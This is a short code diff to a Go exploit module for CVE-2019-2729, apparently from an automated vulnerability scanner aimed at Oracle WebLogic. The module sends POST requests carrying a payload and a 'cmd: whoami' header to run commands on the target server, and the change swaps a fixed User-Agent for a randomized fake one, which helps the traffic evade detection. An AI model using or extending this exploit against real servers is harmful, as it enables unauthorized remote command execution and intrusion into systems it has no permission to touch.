@@ -1,6 +1,7 @@
 package CVE_2019_2729
 
 import (
+	"config"
 	"fmt"
 	"io/ioutil"
 	"net/http"
@@ -3538,7 +3539,7 @@ func Run(u string, port string) {
 		Timeout: time.Duration(3 * time.Second),
 	}
 	request1, err := http.NewRequest("POST", url+path1, strings.NewReader(payload1))
-	request1.Header.Set("User-Agent", "ceshi/0.0.1")
+	request1.Header.Set("User-Agent", config.Fakeua())
 	request1.Header.Set("Content-Type", "text/xml")
 	request1.Header.Set("cmd", "whoami")
 	if err != nil {
@@ -3561,7 +3562,7 @@ func Run(u string, port string) {
 	time.Sleep(1 * time.Second)
 
 	request2, err := http.NewRequest("POST", url+path2, strings.NewReader(payload1))
-	request2.Header.Set("User-Agent", "ceshi/0.0.1")
+	request2.Header.Set("User-Agent", config.Fakeua())
 	request2.Header.Set("Content-Type", "text/xml")
 	request2.Header.Set("cmd", "whoami")
 	if err != nil {
